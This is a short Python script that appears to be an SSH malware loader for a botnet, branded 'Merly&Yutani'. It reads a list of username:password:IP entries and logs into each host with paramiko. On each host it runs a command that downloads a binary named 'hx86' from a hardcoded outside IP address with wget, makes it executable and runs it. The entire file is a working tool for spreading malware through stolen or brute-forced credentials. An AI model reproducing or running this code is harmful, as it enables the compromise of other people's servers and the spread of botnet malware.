import sys
import paramiko
import threading


PAYLOAD = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://162.220.8.224/wrgjwrgjwrg246356356356/hx86;  chmod +x *;./hx86 wget.exploit.ssh"

def load(username, password, ip):
    print("\x1b[1;31m[\x1b[1;37mMerly\x1b[1;31m&\x1b[1;37mYutani\x1b[1;31m][\x1b[1;32mLOADING\x1b[1;31m]\x1b[0;37m loading "+ip+" with "+username+":"+password+"")
    sshobj = paramiko.SSHClient()
    sshobj.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    try:
        sshobj.connect(ip, username=username, password=password, port=22, look_for_keys=True, timeout=10)
        print("\x1b[1;31m[\x1b[1;37mMerly\x1b[1;31m&\x1b[1;37mYutani\x1b[1;31m][\x1b[1;32mLOADER\x1b[1;31m]\x1b[0;37m logged in to " + ip + " with " + username + ":" + password + "")
    except Exception as e:
        # paramiko raises SSHException('No authentication methods available',) since we did not specify any auth methods. socket stays open.
        print("\x1b[1;31m[\x1b[1;33mERROR\x1b[1;31m] = [\x1b[1;33mNot Loaded\x1b[1;31m] \x1b[0;37" + ip + " with " + username + ":" + password + " >> Exception: "+str(e))
        return
    stdin, stdout, stderr = sshobj.exec_command(PAYLOAD)
    print("\x1b[1;31m[\x1b[1;37mMerly\x1b[1;31m&\x1b[1;37mYutani\x1b[1;31m][\x1b[1;36mServer\x1b[1;31m|\x1b[1;36mBruteLogin\x1b[1;31m]\x1b[0;37m Server output: "+"".join(stdout.readlines()).strip())
if not len(sys.argv) > 1:
    print("\x1b[1;31m[\x1b[1;33mERROR\x1b[1;31m]\x1b[0;37m " + sys.argv[0] + " <file to load>")
    exit(-1)
with open(sys.argv[1], "r") as file:
    for server in file:
        splitted = server.split(":")
        threading.Thread(target=load, args=(splitted[0], splitted[1], splitted[2])).start()


